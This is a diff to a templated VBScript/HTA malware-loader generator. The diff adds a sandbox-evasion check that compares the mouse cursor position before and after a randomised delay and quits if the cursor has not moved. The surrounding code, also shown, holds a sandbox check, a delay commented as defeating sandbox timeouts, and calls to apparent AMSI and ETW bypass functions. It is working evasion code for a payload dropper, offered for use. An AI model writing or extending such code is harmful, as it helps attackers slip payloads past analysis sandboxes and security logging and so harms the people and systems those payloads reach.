@@ -74,9 +74,60 @@ End Function
 
 Sub {{ v.sub_run }}()
     If {{ v.fn_sandbox }}() Then self.close: Exit Sub
+    ' Record cursor position before delay; check movement after — no extra wait
+    Dim _cx0 As Long, _cy0 As Long, _gotCur As Boolean
+    _cx0 = -999: _cy0 = -999: _gotCur = False
+    On Error Resume Next
+    Dim _ca: Set _ca = CreateObject("System.Reflection.Assembly")
+    If Err.Number = 0 Then
+        Dim _wf: Set _wf = _ca.LoadWithPartialName("System.Windows.Forms")
+        If Err.Number = 0 And Not IsNull(_wf) And Not IsEmpty(_wf) Then
+            Dim _ct: Set _ct = _wf.GetType("System.Windows.Forms.Cursor")
+            If Err.Number = 0 And Not IsNull(_ct) Then
+                Dim _pp: Set _pp = _ct.GetProperty("Position", 24)
+                If Err.Number = 0 And Not IsNull(_pp) Then
+                    Dim _ps: Set _ps = _pp.GetValue(Nothing, Nothing)
+                    If Err.Number = 0 And Not IsNull(_ps) Then
+                        _cx0 = _ps.GetType().GetProperty("X").GetValue(_ps, Nothing)
+                        _cy0 = _ps.GetType().GetProperty("Y").GetValue(_ps, Nothing)
+                        If Err.Number = 0 Then _gotCur = True
+                    End If
+                End If
+            End If
+        End If
+    End If
+    Err.Clear
+    On Error GoTo 0
     ' Brief execution delay (defeats fast sandbox timeouts)
     Dim t0: t0 = Timer
     Do While Timer - t0 < 2 + Rnd * 3: Loop
+    ' Cursor check: if position unchanged over the delay, treat as sandbox
+    If _gotCur Then
+        On Error Resume Next
+        Dim _ca2: Set _ca2 = CreateObject("System.Reflection.Assembly")
+        If Err.Number = 0 Then
+            Dim _wf2: Set _wf2 = _ca2.LoadWithPartialName("System.Windows.Forms")
+            If Err.Number = 0 And Not IsNull(_wf2) And Not IsEmpty(_wf2) Then
+                Dim _ct2: Set _ct2 = _wf2.GetType("System.Windows.Forms.Cursor")
+                If Err.Number = 0 And Not IsNull(_ct2) Then
+                    Dim _pp2: Set _pp2 = _ct2.GetProperty("Position", 24)
+                    If Err.Number = 0 And Not IsNull(_pp2) Then
+                        Dim _ps2: Set _ps2 = _pp2.GetValue(Nothing, Nothing)
+                        If Err.Number = 0 And Not IsNull(_ps2) Then
+                            Dim _cx2 As Long, _cy2 As Long
+                            _cx2 = _ps2.GetType().GetProperty("X").GetValue(_ps2, Nothing)
+                            _cy2 = _ps2.GetType().GetProperty("Y").GetValue(_ps2, Nothing)
+                            If Err.Number = 0 Then
+                                If _cx0 = _cx2 And _cy0 = _cy2 Then self.close: Exit Sub
+                            End If
+                        End If
+                    End If
+                End If
+            End If
+        End If
+        Err.Clear
+        On Error GoTo 0
+    End If
     Call {{ v.fn_amsi }}()
     Call {{ v.fn_etw }}()
 
